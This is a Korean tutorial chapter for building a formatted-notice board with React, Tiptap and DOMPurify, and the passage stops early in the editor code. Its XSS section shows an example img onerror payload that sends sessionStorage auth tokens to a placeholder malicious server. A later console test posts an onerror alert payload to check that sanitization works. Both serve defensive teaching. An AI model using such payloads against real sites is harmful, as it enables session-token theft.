# Part 11. 공지사항 (서식 에디터)

> **이 Part의 목표**: 관리자가 글자색·굵게·크기 등 **서식을 넣어** 공지를 쓰고, 사용자는 목록·상세 탭에서 읽는 게시판을 만듭니다.
> 지금까지 배운 것(페이징, 공통코드, 권한, 탭 열기·제목·닫기, 변경 확인)을 한 번에 쓰는 종합 실습입니다.
> 서식이 있는 HTML을 화면에 그릴 때의 보안 문제(XSS)도 함께 다룹니다.

---

## Step 11-1. 공지사항 API와 목록

> 🎯 **할 일**: 공지 데이터와 가짜 API를 만들고, 목록 화면을 띄웁니다.

### 데이터 설계

| 필드        | 설명                                                          |
| ----------- | ------------------------------------------------------------- |
| `type`      | 공통코드 `NOTICE_TYPE` (일반·긴급)                            |
| `content`   | **HTML 문자열.** 서식이 들어가므로 일반 텍스트가 아니다       |
| `pinned`    | 상단 고정. 목록 맨 위에 보인다                                |
| `read`      | (목록 응답에만) **내가** 읽었는가. 사람마다 다르다            |

"읽음"은 공지 자체의 속성이 아니라 **사람 × 공지**의 관계입니다. 그래서 별도 테이블(`noticeReads`)에 둡니다.
상세 화면을 열면 `POST /notices/{id}/read`로 읽음을 기록합니다. 조회(GET)가 데이터를 바꾸지 않게 따로 요청합니다. (REST에서 GET은 "안전한" 요청이어야 합니다.)

### 따라 하기

날짜 표시 도우미를 먼저 만듭니다. Part 13에서 이 파일에 포맷 함수를 더 모읍니다.

📄 **`src/shared/lib/format.ts`** (새 파일)

```ts
import dayjs from "dayjs";

/** "2026-11-07T09:30:00Z" → "2026-11-07" */
export function formatDate(value?: string | null) {
  return value ? dayjs(value).format("YYYY-MM-DD") : "";
}

/** "2026-11-07T09:30:00Z" → "2026-11-07 18:30" (내 PC 시간대로) */
export function formatDateTime(value?: string | null) {
  return value ? dayjs(value).format("YYYY-MM-DD HH:mm") : "";
}
```

📄 **`src/features/notice/types.ts`** (새 파일)

```ts
export interface Notice {
  id: number;
  type: string; // 공통코드 NOTICE_TYPE
  title: string;
  content: string; // HTML
  pinned: boolean;
  authorName: string;
  views: number;
  createdAt: string; // ISO 8601
  updatedAt: string;
}

/** 목록용. 본문은 빼고, 내가 읽었는지를 붙인다. */
export interface NoticeListItem extends Omit<Notice, "content"> {
  read: boolean;
}

export type NoticeInput = Pick<Notice, "type" | "title" | "content" | "pinned">;

export interface NoticeSearchCondition {
  title?: string;
  type?: string;
}
```

시드 데이터입니다. 본문에 서식(색, 굵게, 목록)이 들어간 HTML이 있습니다.

📄 **`src/mocks/data/notices.ts`** (새 파일)

```ts
import type { Notice } from "@/features/notice/types";

function notice(
  id: number,
  type: string,
  title: string,
  content: string,
  createdAt: string,
  pinned = false,
): Notice {
  return {
    id,
    type,
    title,
    content,
    pinned,
    authorName: "김민수",
    views: 0,
    createdAt,
    updatedAt: createdAt,
  };
}

export const noticeSeed: Notice[] = [
  notice(
    1,
    "URGENT",
    "[긴급] 11월 9일 서버 점검 안내",
    '<p><strong>11월 9일(일) 02:00 ~ 06:00</strong> 서버 점검이 있습니다.</p><p><span style="color: #f5222d">점검 중에는 시스템을 사용할 수 없습니다.</span> 작업 중인 내용은 미리 저장해 주세요.</p>',
    "2026-11-06T09:00:00+09:00",
    true,
  ),
  notice(
    2,
    "GENERAL",
    "SI Template 사용 안내",
    "<h2>시작하기</h2><ul><li>왼쪽 메뉴에서 화면을 엽니다.</li><li>탭을 오가도 입력 내용이 유지됩니다.</li><li>헤더의 톱니바퀴에서 테마를 바꿀 수 있습니다.</li></ul>",
    "2026-11-01T10:00:00+09:00",
    true,
  ),
  notice(
    3,
    "GENERAL",
    "개인정보 처리방침 개정 안내",
    '<p>개인정보 처리방침이 <span style="background-color: #fadb14">12월 1일</span>부터 개정됩니다.</p>',
    "2026-10-28T14:00:00+09:00",
  ),
  notice(
    4,
    "GENERAL",
    "비밀번호 변경 권장",
    "<p>보안을 위해 <strong>3개월마다</strong> 비밀번호를 바꿔 주세요. 내 정보 수정 화면에서 바꿀 수 있습니다.</p>",
    "2026-10-20T09:30:00+09:00",
  ),
  notice(
    5,
    "GENERAL",
    "업무 매뉴얼 업데이트",
    '<p style="text-align: center">업무 매뉴얼 <em>2.0</em>이 게시되었습니다.</p>',
    "2026-10-10T16:00:00+09:00",
  ),
];
```

✏️ **`src/mocks/db.ts`** — import를 추가합니다.

```ts
import { menuSeed } from "@/mocks/data/menus";
```

바꿀 코드

```ts
import { menuSeed } from "@/mocks/data/menus";
import { noticeSeed } from "@/mocks/data/notices";
```

✏️ **`src/mocks/db.ts`** — 테이블을 추가합니다.

```ts
export const codesTable = createTable("codes", codeSeed);
```

바꿀 코드

```ts
export const codesTable = createTable("codes", codeSeed);
export const noticesTable = createTable("notices", noticeSeed);
// 누가 어떤 공지를 읽었는지. 사람 × 공지 관계라서 공지와 따로 둔다.
export const noticeReadsTable = createTable<{
  id: number;
  noticeId: number;
  userId: number;
  readAt: string;
}>("noticeReads", []);
```

가짜 API입니다. 공지 관련 권한은 모두 `NOTICE` 메뉴 기준으로 검사합니다. 상세·작성 화면은 화면 진입용 메뉴일 뿐, 데이터 권한은 공지사항 메뉴 하나로 관리합니다.

📄 **`src/mocks/handlers/notices.ts`** (새 파일)

```ts
import { http, HttpResponse } from "msw";
import type { Notice, NoticeInput, NoticeListItem } from "@/features/notice/types";
import { authorize } from "@/mocks/auth";
import { noticeReadsTable, noticesTable } from "@/mocks/db";
import { apiUrl, paginate, problem } from "@/mocks/utils";

const MENU = "NOTICE";

function toListItem(notice: Notice, read: boolean): NoticeListItem {
  return {
    id: notice.id,
    type: notice.type,
    title: notice.title,
    pinned: notice.pinned,
    authorName: notice.authorName,
    views: notice.views,
    createdAt: notice.createdAt,
    updatedAt: notice.updatedAt,
    read,
  };
}

export const noticeHandlers = [
  // 목록: 고정 공지 먼저, 그다음 최신순. 본문은 빼고 "내가 읽었는지"를 붙인다.
  http.get(apiUrl("/notices"), ({ request }) => {
    const { user, error } = authorize(request, MENU, "READ");
    if (error) return error;
    const params = new URL(request.url).searchParams;
    const title = params.get("title") ?? "";
    const type = params.get("type");
    const readIds = new Set(
      noticeReadsTable
        .all()
        .filter((item) => item.userId === user.id)
        .map((item) => item.noticeId),
    );
    const rows = noticesTable
      .all()
      .filter((notice) => notice.title.includes(title) && (!type || notice.type === type))
      .sort((a, b) => Number(b.pinned) - Number(a.pinned) || b.createdAt.localeCompare(a.createdAt))
      .map((notice) => toListItem(notice, readIds.has(notice.id)));
    return HttpResponse.json(paginate(rows, params));
  }),

  http.get(apiUrl("/notices/:id"), ({ request, params }) => {
    const { error } = authorize(request, MENU, "READ");
    if (error) return error;
    const notice = noticesTable.find(Number(params.id));
    if (!notice) return problem(404, "공지사항을 찾을 수 없습니다.");
    return HttpResponse.json(noticesTable.update(notice.id, { views: notice.views + 1 }));
  }),

  // 읽음 기록. 이미 읽었으면 아무것도 하지 않는다. (몇 번 불러도 결과가 같다 = 멱등)
  http.post(apiUrl("/notices/:id/read"), ({ request, params }) => {
    const { user, error } = authorize(request, MENU, "READ");
    if (error) return error;
    const noticeId = Number(params.id);
    const already = noticeReadsTable
      .all()
      .some((item) => item.noticeId === noticeId && item.userId === user.id);
    if (!already) {
      noticeReadsTable.insert({ noticeId, userId: user.id, readAt: new Date().toISOString() });
    }
    return new HttpResponse(null, { status: 204 });
  }),

  http.post(apiUrl("/notices"), async ({ request }) => {
    const { user, error } = authorize(request, MENU, "CREATE");
    if (error) return error;
    const input = (await request.json()) as NoticeInput;
    const now = new Date().toISOString();
    const notice = noticesTable.insert({
      ...input,
      authorName: user.name,
      views: 0,
      createdAt: now,
      updatedAt: now,
    });
    return HttpResponse.json(notice, { status: 201 });
  }),

  http.put(apiUrl("/notices/:id"), async ({ request, params }) => {
    const { error } = authorize(request, MENU, "UPDATE");
    if (error) return error;
    const input = (await request.json()) as NoticeInput;
    const notice = noticesTable.update(Number(params.id), {
      ...input,
      updatedAt: new Date().toISOString(),
    });
    return notice ? HttpResponse.json(notice) : problem(404, "공지사항을 찾을 수 없습니다.");
  }),

  http.delete(apiUrl("/notices/:id"), ({ request, params }) => {
    const { error } = authorize(request, MENU, "DELETE");
    if (error) return error;
    const id = Number(params.id);
    noticesTable.remove(id);
    noticeReadsTable
      .all()
      .filter((item) => item.noticeId === id)
      .forEach((item) => noticeReadsTable.remove(item.id));
    return new HttpResponse(null, { status: 204 });
  }),
];
```

> ⚠️ **주의** 실제 서버는 저장하기 전에 HTML을 **반드시 소독(sanitize)** 해야 합니다. (Java는 OWASP Java HTML Sanitizer 등)
> 화면에서만 막으면, 누군가 API를 직접 호출해 악성 HTML을 저장할 수 있습니다. 화면 쪽 방어는 Step 11-2에서 합니다.

✏️ **`src/mocks/handlers.ts`** — 등록합니다.

```ts
import { menuHandlers } from "@/mocks/handlers/menus";
```

바꿀 코드

```ts
import { menuHandlers } from "@/mocks/handlers/menus";
import { noticeHandlers } from "@/mocks/handlers/notices";
```

✏️ **`src/mocks/handlers.ts`** — 배열에 추가합니다.

```ts
  ...codeHandlers,
];
```

바꿀 코드

```ts
  ...codeHandlers,
  ...noticeHandlers,
];
```

앱 쪽 API와 Query 훅입니다.

📄 **`src/features/notice/api/queries.ts`** (새 파일)

```ts
import { keepPreviousData, useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
import type {
  Notice,
  NoticeInput,
  NoticeListItem,
  NoticeSearchCondition,
} from "@/features/notice/types";
import { httpClient } from "@/shared/api/httpClient";
import type { PageRequest, PageResponse } from "@/shared/api/types";

export const noticeKeys = {
  all: ["notices"] as const,
  list: (condition: NoticeSearchCondition & PageRequest) =>
    [...noticeKeys.all, "list", condition] as const,
  detail: (id: number) => [...noticeKeys.all, "detail", id] as const,
};

export function useNoticePage(condition: NoticeSearchCondition & PageRequest) {
  return useQuery({
    queryKey: noticeKeys.list(condition),
    queryFn: ({ signal }) =>
      httpClient.get<PageResponse<NoticeListItem>>("/notices", { params: condition, signal }),
    placeholderData: keepPreviousData,
  });
}

export function useNotice(id?: number) {
  return useQuery({
    queryKey: noticeKeys.detail(id ?? 0),
    queryFn: () => httpClient.get<Notice>(`/notices/${id}`),
    enabled: id !== undefined, // 새 글 작성일 때는 조회하지 않는다
  });
}

/** 읽음 기록. 성공하면 목록을 무효화해서 굵은 글씨(안 읽음)가 풀리게 한다. */
export function useMarkNoticeRead() {
  const queryClient = useQueryClient();
  return useMutation({
    mutationFn: (id: number) => httpClient.post(`/notices/${id}/read`),
    onSuccess: () => queryClient.invalidateQueries({ queryKey: [...noticeKeys.all, "list"] }),
  });
}

export function useSaveNotice() {
  const queryClient = useQueryClient();
  return useMutation({
    mutationFn: ({ id, input }: { id?: number; input: NoticeInput }) =>
      id
        ? httpClient.put<Notice>(`/notices/${id}`, input)
        : httpClient.post<Notice>("/notices", input),
    meta: { skipGlobalError: true },
    onSuccess: () => queryClient.invalidateQueries({ queryKey: noticeKeys.all }),
  });
}

export function useDeleteNotice() {
  const queryClient = useQueryClient();
  return useMutation({
    mutationFn: (id: number) => httpClient.delete(`/notices/${id}`),
    onSuccess: () => queryClient.invalidateQueries({ queryKey: noticeKeys.all }),
  });
}
```

문구 파일입니다. 이 Part 전체에서 쓸 문구를 한 번에 넣습니다.

📄 **`src/shared/i18n/locales/ko/notice.json`** (새 파일)

```json
{
  "search": {
    "title": "제목",
    "type": "유형"
  },
  "column": {
    "type": "유형",
    "title": "제목",
    "author": "작성자",
    "createdAt": "작성일",
    "views": "조회"
  },
  "field": {
    "type": "유형",
    "title": "제목",
    "pinned": "상단 고정",
    "content": "내용"
  },
  "write": "글쓰기",
  "views": "조회 {{count}}",
  "viewTitle": "공지 - {{title}}",
  "editTitle": "수정 - {{title}}",
  "notFound": "공지사항을 찾을 수 없습니다."
}
```

📄 **`src/shared/i18n/locales/en/notice.json`** (새 파일)

```json
{
  "search": {
    "title": "Title",
    "type": "Type"
  },
  "column": {
    "type": "Type",
    "title": "Title",
    "author": "Author",
    "createdAt": "Posted",
    "views": "Views"
  },
  "field": {
    "type": "Type",
    "title": "Title",
    "pinned": "Pin to top",
    "content": "Content"
  },
  "write": "Write",
  "views": "{{count}} views",
  "viewTitle": "Notice - {{title}}",
  "editTitle": "Edit - {{title}}",
  "notFound": "Notice not found."
}
```

목록 화면입니다. 행을 더블클릭하면 **상세 화면이 새 탭으로** 열립니다. (`useOpenPage`, Part 7)

📄 **`src/features/notice/pages/NoticeListPage.tsx`** (새 파일)

```tsx
import { useMemo, useState } from "react";
import { useTranslation } from "react-i18next";
import { Button, Form, Input, Pagination, Tag } from "antd";
import { PushpinFilled } from "@ant-design/icons";
import type { ColDef } from "ag-grid-community";
import { useNoticePage } from "@/features/notice/api/queries";
import type { NoticeListItem, NoticeSearchCondition } from "@/features/notice/types";
import type { PageRequest } from "@/shared/api/types";
import Can from "@/shared/auth/Can";
import CodeSelect from "@/shared/codes/CodeSelect";
import { useCodeName } from "@/shared/codes/useCodes";
import { formatDateTime } from "@/shared/lib/format";
import { useOpenPage } from "@/shared/page/useOpenPage";
import DataGrid from "@/shared/ui/DataGrid";
import PageContainer from "@/shared/ui/PageContainer";
import SearchForm from "@/shared/ui/SearchForm";

// 고정 공지가 맨 위에 오는 서버 순서를 그대로 보여 준다. 그리드 정렬은 끈다.
const noSortColDef: ColDef<NoticeListItem> = { sortable: false };

function NoticeListPage() {
  const { t } = useTranslation("notice");
  const openPage = useOpenPage();
  const formatType = useCodeName("NOTICE_TYPE");
  const [condition, setCondition] = useState<NoticeSearchCondition>({});
  const [paging, setPaging] = useState<PageRequest>({ page: 0, size: 20, sort: "" });
  const { data, isFetching, refetch } = useNoticePage({ ...condition, ...paging });

  const columnDefs = useMemo<ColDef<NoticeListItem>[]>(
    () => [
      {
        headerName: t("column.type"),
        field: "type",
        width: 100,
        flex: 0,
        // cellRenderer: 셀 안에 React 컴포넌트를 그린다. 글자만 바꾸는 valueFormatter보다 자유롭다.
        cellRenderer: ({ value }: { value: string }) => (
          <Tag color={value === "URGENT" ? "red" : "blue"}>{formatType(value)}</Tag>
        ),
      },
      {
        headerName: t("column.title"),
        field: "title",
        flex: 3,
        cellRenderer: ({ data: notice }: { data?: NoticeListItem }) =>
          notice && (
            <span>
              {notice.pinned && <PushpinFilled style={{ marginInlineEnd: 6 }} />}
              {notice.title}
            </span>
          ),
      },
      { headerName: t("column.author"), field: "authorName" },
      {
        headerName: t("column.createdAt"),
        field: "createdAt",
        valueFormatter: ({ value }) => formatDateTime(value),
      },
      { headerName: t("column.views"), field: "views", width: 90, flex: 0 },
    ],
    [t, formatType],
  );

  return (
    <PageContainer
      extra={
        <Can action="CREATE">
          <Button type="primary" onClick={() => openPage("NOTICE_EDIT")}>
            {t("write")}
          </Button>
        </Can>
      }
    >
      <SearchForm<NoticeSearchCondition>
        onSearch={(values) => {
          setCondition(values);
          setPaging((prev) => ({ ...prev, page: 0 }));
        }}
        onSameSearch={refetch}
      >
        <Form.Item name="title" label={t("search.title")}>
          <Input allowClear />
        </Form.Item>
        <Form.Item name="type" label={t("search.type")}>
          <CodeSelect
            group="NOTICE_TYPE"
            placeholder={t("common:label.all")}
            allowClear
            style={{ width: 120 }}
          />
        </Form.Item>
      </SearchForm>
      <DataGrid<NoticeListItem>
        rowData={data?.content}
        columnDefs={columnDefs}
        defaultColDef={noSortColDef}
        loading={isFetching}
        getRowId={({ data: notice }) => String(notice.id)}
        // 안 읽은 공지는 행 전체를 굵게. 셀이 아니라 "행" 스타일로 해야 읽음 상태가 바뀔 때 바로 반영된다.
        getRowStyle={({ data: notice }) => (notice?.read ? undefined : { fontWeight: 600 })}
        onRowDoubleClicked={({ data: notice }) =>
          notice && openPage("NOTICE_VIEW", { id: String(notice.id) })
        }
      />
      <Pagination
        align="end"
        size="small"
        current={paging.page + 1}
        pageSize={paging.size}
        total={data?.page.totalElements ?? 0}
        showTotal={(total) => t("common:label.total", { count: total })}
        onChange={(page, size) => setPaging((prev) => ({ ...prev, page: page - 1, size }))}
      />
    </PageContainer>
  );
}

export default NoticeListPage;
```

### 코드 읽어 보기: 셀은 "값이 바뀔 때만" 다시 그려진다

`getRowId`가 있으면 AG Grid는 다시 조회한 데이터를 기존 행과 맞춰 보고 **값이 바뀐 셀만** 다시 그립니다. 빠르고 깜빡임이 없는 이유입니다.
그런데 "읽음" 여부를 제목 셀의 `cellRenderer`에서 굵기로 표현하면, 제목 값은 그대로라서 셀이 다시 그려지지 않습니다. 읽었는데도 계속 굵게 보입니다.
그래서 굵기는 **행 스타일**(`getRowStyle`)로 줍니다. 행 데이터가 바뀌면 행 스타일은 다시 계산됩니다.

### 확인하기

- [ ] 게시판 → 공지사항. 고정 공지 2건이 📌와 함께 맨 위에 있고, 모두 **굵은 글씨**(안 읽음)입니다.
- [ ] 긴급 공지의 유형이 빨간 태그입니다.
- [ ] `user`로 로그인해도 목록이 보이고, [글쓰기] 버튼은 없습니다.
- [ ] 더블클릭하면 "화면 준비 중" 탭이 열립니다. 주소가 `/board/notices/view?id=1`입니다. (상세 화면은 다음 Step)

✅ **커밋**

```powershell
git add .
git commit -m "feat: 공지사항 목록 추가"
```

---

## Step 11-2. 상세 화면과 안전한 HTML 표시

> 🎯 **할 일**: 공지 상세를 탭으로 보여 주고, 서식 있는 HTML을 **안전하게** 그립니다.

### 원리: XSS와 소독(sanitize)

React는 `{문자열}`을 화면에 그릴 때 HTML 태그를 **글자로** 바꿔 줍니다. `<b>`를 넣어도 굵어지지 않고 `<b>`라는 글자가 보입니다.
덕분에 기본적으로 안전하지만, 서식 있는 공지는 HTML을 HTML로 그려야 합니다. 이때 쓰는 것이 `dangerouslySetInnerHTML`입니다.
이름에 "위험하다(dangerously)"가 들어 있는 이유가 있습니다.

```html
<p>공지입니다</p><img src="x" onerror="fetch('https://악성서버?c=' + sessionStorage.auth)">
```

이런 본문이 그대로 그려지면, 공지를 연 **모든 사람의 토큰이 털립니다.** 이것이 XSS(Cross-Site Scripting)입니다.
그래서 HTML을 그리기 전에 **DOMPurify**로 위험한 부분(`<script>`, `onerror=` 같은 이벤트 속성, `javascript:` 링크 등)을 지웁니다.
서식(`style="color: ..."`, `<strong>`)은 남기고 공격 코드만 지웁니다.

> ⚠️ **주의** `dangerouslySetInnerHTML`은 이 템플릿에서 **`SafeHtml` 한 곳에서만** 씁니다. 다른 곳에서 직접 쓰지 않습니다. (설계 원칙 1번)

### 따라 하기

▶️ **터미널**

```powershell
npm install dompurify@3.4.17
```

✅ **커밋**

```powershell
git add .
git commit -m "chore: dompurify 의존성 추가"
```

서식 있는 본문의 모양(문단 간격, 제목 크기, 목록 들여쓰기)을 정합니다. 에디터와 상세 화면이 **같은 스타일**을 써야 "쓴 그대로" 보입니다.
이번에는 CSS Modules를 써 봅니다.

📄 **`src/shared/ui/RichText.module.css`** (새 파일)

```css
/* 서식 있는 본문. 에디터(입력)와 SafeHtml(표시)이 같은 모양을 쓰도록 한 파일에 둔다.
   색은 Part 4의 --app-* 변수를 써서 다크 모드를 따른다. */
.content {
  color: var(--app-color-text);
  line-height: 1.7;
  word-break: break-word;
}

.content :global(p) {
  margin: 0 0 0.6em;
}

.content :global(h2) {
  font-size: 1.4em;
  margin: 0.8em 0 0.4em;
}

.content :global(h3) {
  font-size: 1.2em;
  margin: 0.8em 0 0.4em;
}

.content :global(ul),
.content :global(ol) {
  padding-inline-start: 1.5em;
  margin: 0 0 0.6em;
}

.content :global(a) {
  color: var(--app-color-primary);
}

.content :global(blockquote) {
  margin: 0 0 0.6em;
  padding-inline-start: 12px;
  border-inline-start: 3px solid var(--app-color-border);
  color: var(--app-color-text-secondary);
}

/* ── 에디터 전용 ── */
.editor {
  border: 1px solid var(--app-color-border);
  border-radius: var(--app-radius);
  background: var(--app-color-bg);
  overflow: hidden;
}

.toolbar {
  display: flex;
  flex-wrap: wrap;
  align-items: center;
  gap: 2px;
  padding: 4px;
  border-bottom: 1px solid var(--app-color-border);
  background: var(--app-color-fill);
}

.editor :global(.ProseMirror) {
  min-height: 280px;
  padding: 12px 16px;
  outline: none;
}
```

### CSS Modules가 뭔가요?

파일 이름을 `xxx.module.css`로 지으면, 안의 클래스 이름이 **파일마다 고유하게** 바뀝니다. `.content`가 실제로는 `._content_x7k2a`처럼 됩니다.
다른 파일의 `.content`와 이름이 겹쳐도 충돌하지 않습니다. 코드에서는 `styles.content`로 씁니다.

`:global(p)`는 "이 안의 `p` 태그는 이름을 바꾸지 말라"는 뜻입니다. HTML 본문의 태그는 우리가 클래스를 붙일 수 없기 때문입니다.

📄 **`src/shared/ui/SafeHtml.tsx`** (새 파일)

```tsx
import { useMemo } from "react";
import DOMPurify from "dompurify";
import styles from "@/shared/ui/RichText.module.css";

interface SafeHtmlProps {
  html: string;
}

/**
 * 서버에서 받은 HTML을 소독한 뒤 그린다. 이 앱에서 dangerouslySetInnerHTML은 여기서만 쓴다.
 * 서식(style, strong 등)은 남기고, script·onerror 같은 공격 코드는 지운다.
 */
function SafeHtml({ html }: SafeHtmlProps) {
  const clean = useMemo(
    () => DOMPurify.sanitize(html, { ADD_ATTR: ["target"] }), // 링크의 새 창 열기(target)는 허용
    [html],
  );
  return <div className={styles.content} dangerouslySetInnerHTML={{ __html: clean }} />;
}

export default SafeHtml;
```

상세 화면입니다. **탭으로 받은 파라미터(`usePage().params.id`)** 로 공지를 조회합니다. 주소(`useSearchParams`)를 보지 않습니다. (Part 7 규칙)

📄 **`src/features/notice/pages/NoticeViewPage.tsx`** (새 파일)

```tsx
import { useEffect } from "react";
import { useTranslation } from "react-i18next";
import { App, Button, Card, Divider, Result, Space, Tag, Typography } from "antd";
import { useDeleteNotice, useMarkNoticeRead, useNotice } from "@/features/notice/api/queries";
import Can from "@/shared/auth/Can";
import { useCodeName } from "@/shared/codes/useCodes";
import { formatDateTime } from "@/shared/lib/format";
import { usePage } from "@/shared/page/PageContext";
import { useClosePage } from "@/shared/page/useClosePage";
import { useOpenPage } from "@/shared/page/useOpenPage";
import { usePageTitle } from "@/shared/page/usePageTitle";
import PageContainer from "@/shared/ui/PageContainer";
import PageLoading from "@/shared/ui/PageLoading";
import SafeHtml from "@/shared/ui/SafeHtml";

function NoticeViewPage() {
  const { t } = useTranslation("notice");
  const { message, modal } = App.useApp();
  const { params } = usePage();
  const id = Number(params.id);
  const { data: notice, isPending, isError } = useNotice(id);
  const { mutate: markRead } = useMarkNoticeRead();
  const deleteNotice = useDeleteNotice();
  const openPage = useOpenPage();
  const closePage = useClosePage();
  const formatType = useCodeName("NOTICE_TYPE");

  // 탭 제목을 "공지 - 제목"으로 바꾼다
  usePageTitle(notice && t("viewTitle", { title: notice.title }));

  // 화면이 열리면 읽음으로 기록한다
  useEffect(() => {
    if (id) markRead(id);
  }, [id, markRead]);

  if (isPending) return <PageLoading />;
  if (isError || !notice) return <Result status="404" title={t("notFound")} />;

  const handleDelete = () =>
    modal.confirm({
      title: t("common:message.confirmDelete", { count: 1 }),
      okButtonProps: { danger: true },
      onOk: () =>
        deleteNotice
          .mutateAsync(notice.id)
          .then(() => {
            message.success(t("common:message.deleted"));
            closePage({ force: true });
          })
          .catch(() => undefined),
    });

  return (
    <PageContainer
      title={notice.title}
      extra={
        <Space>
          <Button onClick={() => openPage("NOTICE")}>{t("common:button.list")}</Button>
          {/* 데이터 권한은 공지사항(NOTICE) 메뉴 기준이다. 이 화면의 메뉴(NOTICE_VIEW)가 아니라 menuCode를 직접 넘긴다. */}
          <Can action="UPDATE" menuCode="NOTICE">
            <Button onClick={() => openPage("NOTICE_EDIT", { id: String(notice.id) })}>
              {t("common:button.edit")}
            </Button>
          </Can>
          <Can action="DELETE" menuCode="NOTICE">
            <Button danger onClick={handleDelete}>
              {t("common:button.delete")}
            </Button>
          </Can>
        </Space>
      }
    >
      <Card>
        <Space wrap>
          <Tag color={notice.type === "URGENT" ? "red" : "blue"}>{formatType(notice.type)}</Tag>
          <Typography.Text type="secondary">
            {notice.authorName} · {formatDateTime(notice.createdAt)} ·{" "}
            {t("views", { count: notice.views })}
          </Typography.Text>
        </Space>
        <Divider />
        <SafeHtml html={notice.content} />
      </Card>
    </PageContainer>
  );
}

export default NoticeViewPage;
```

### 코드 읽어 보기

**`const { mutate: markRead } = useMarkNoticeRead()`**: `useMutation`이 돌려주는 객체는 렌더마다 바뀌지만, 그 안의 `mutate` 함수는 **항상 같습니다.**
그래서 `useEffect`의 의존성에 넣어도 Effect가 쓸데없이 다시 실행되지 않습니다. 객체 통째로 넣으면 렌더마다 읽음 요청이 나갑니다.

**`usePageTitle(notice && ...)`**: 데이터가 오기 전에는 `undefined`라서 메뉴 이름("공지사항 상세")을 쓰고, 데이터가 오면 공지 제목으로 바뀝니다.

**훅은 `if` 위에**: `if (isPending) return`보다 **위에서** 모든 훅을 부릅니다. 아래에 두면 로딩 중일 때와 아닐 때 훅 호출 개수가 달라져서 React가 오류를 냅니다.

### 확인하기

- [ ] 목록에서 공지를 더블클릭 → 새 탭 **"공지 - [긴급] 11월 9일 서버 점검 안내"**. 빨간 글씨·굵은 글씨가 그대로 보입니다.
- [ ] 다른 공지를 더블클릭하면 **또 다른 탭**이 열립니다. (탭 키가 `NOTICE_VIEW?id=…`로 다르다)
- [ ] 목록 탭으로 돌아오면 방금 읽은 공지가 굵은 글씨가 아닙니다. (읽음 → 목록 무효화)
- [ ] 다크 모드에서도 본문 글자가 잘 보입니다. (CSS 변수)
- [ ] XSS 방어 확인: F12 → Console에서 아래를 실행해 공격용 본문을 가진 공지를 만들고, 목록을 새로고침해 열어 봅니다. **경고창이 뜨지 않으면** 성공입니다.

  ```js
  const t = JSON.parse(sessionStorage.auth).state.accessToken;
  await fetch("/api/notices", { method: "POST", headers: { Authorization: `Bearer ${t}` }, body: JSON.stringify({ type: "GENERAL", title: "XSS 테스트", pinned: false, content: '<p>본문</p><img src="x" onerror="alert(\'XSS\')">' }) });
  ```

  확인했으면 그 공지는 삭제합니다.

✅ **커밋**

```powershell
git add .
git commit -m "feat: 공지사항 상세 화면 추가"
```

---

## Step 11-3. 서식 편집기 컴포넌트

> 🎯 **할 일**: 글자색·배경색·굵게·크기·정렬·목록·링크를 넣을 수 있는 편집기를 만듭니다. antd 폼에 그대로 끼워 쓸 수 있게 만듭니다.

### 왜 Tiptap인가요?

| 후보         | 특징                                                                                 |
| ------------ | ------------------------------------------------------------------------------------ |
| **Tiptap (채택)** | ProseMirror 기반. 툴바를 직접 만들어서 antd와 모양을 맞추기 쉽다. 확장으로 기능을 고른다 |
| React Quill  | 설정이 간단하지만 원조 Quill의 React 래퍼 유지보수가 불안정했다                      |
| CKEditor 5   | 기능이 가장 많다. 대신 무겁고, 일부 기능은 상용 라이선스                             |

### antd 폼과 연결하는 규칙

antd `Form.Item` 안에 넣은 컴포넌트는 `value`와 `onChange` props를 **자동으로** 받습니다. 그래서 이 두 개만 지원하면 어떤 컴포넌트든 폼 입력칸이 됩니다.

```tsx
<Form.Item name="content">
  <RichTextEditor />   {/* Form.Item이 value, onChange를 넣어 준다 */}
</Form.Item>
```

### 따라 하기

▶️ **터미널**

```powershell
npm install @tiptap/react@3.33.0 @tiptap/pm@3.33.0 @tiptap/starter-kit@3.33.0 @tiptap/extension-text-style@3.33.0 @tiptap/extension-text-align@3.33.0
```

| 패키지                   | 역할                                                             |
| ------------------------ | ---------------------------------------------------------------- |
| `@tiptap/react`, `@tiptap/pm` | React용 Tiptap과 그 엔진(ProseMirror)                       |
| `starter-kit`            | 굵게·기울임·밑줄·취소선·제목·목록·인용·링크·실행 취소 등 기본 묶음 |
| `extension-text-style`   | 글자색·배경색·글자 크기 (`TextStyleKit`)                         |
| `extension-text-align`   | 문단 정렬                                                        |

✅ **커밋**

```powershell
git add .
git commit -m "chore: tiptap 의존성 추가"
```

툴바 문구입니다. 편집기는 여러 화면이 쓸 수 있는 공통 부품이므로 네임스페이스를 따로 둡니다.

📄 **`src/shared/i18n/locales/ko/editor.json`** (새 파일)

```json
{
  "paragraph": "본문",
  "heading2": "제목 1",
  "heading3": "제목 2",
  "fontSize": "크기",
  "bold": "굵게 (Ctrl+B)",
  "italic": "기울임 (Ctrl+I)",
  "underline": "밑줄 (Ctrl+U)",
  "strike": "취소선",
  "color": "글자색",
  "background": "배경색",
  "alignLeft": "왼쪽 정렬",
  "alignCenter": "가운데 정렬",
  "alignRight": "오른쪽 정렬",
  "bulletList": "글머리 기호",
  "orderedList": "번호 매기기",
  "link": "링크",
  "linkPrompt": "링크 주소를 입력하세요. 비우면 링크를 지웁니다.",
  "clear": "서식 지우기",
  "undo": "실행 취소 (Ctrl+Z)",
  "redo": "다시 실행 (Ctrl+Y)"
}
```

📄 **`src/shared/i18n/locales/en/editor.json`** (새 파일)

```json
{
  "paragraph": "Normal",
  "heading2": "Heading 1",
  "heading3": "Heading 2",
  "fontSize": "Size",
  "bold": "Bold (Ctrl+B)",
  "italic": "Italic (Ctrl+I)",
  "underline": "Underline (Ctrl+U)",
  "strike": "Strikethrough",
  "color": "Text color",
  "background": "Highlight",
  "alignLeft": "Align left",
  "alignCenter": "Align center",
  "alignRight": "Align right",
  "bulletList": "Bulleted list",
  "orderedList": "Numbered list",
  "link": "Link",
  "linkPrompt": "Enter a URL. Leave empty to remove the link.",
  "clear": "Clear formatting",
  "undo": "Undo (Ctrl+Z)",
  "redo": "Redo (Ctrl+Y)"
}
```

편집기 본체입니다. 툴바 버튼은 "지금 커서 위치가 굵은가?" 같은 상태를 알아야 눌린 모양으로 보입니다. `useEditorState`가 그 상태를 골라서 구독합니다.

📄 **`src/shared/ui/RichTextEditor.tsx`** (새 파일)

```tsx
import { useEffect, useRef, type ReactNode } from "react";
import { useTranslation } from "react-i18next";
import { EditorContent, useEditor, useEditorState, type Editor } from "@tiptap/react";
import StarterKit from "@tiptap/starter-kit";
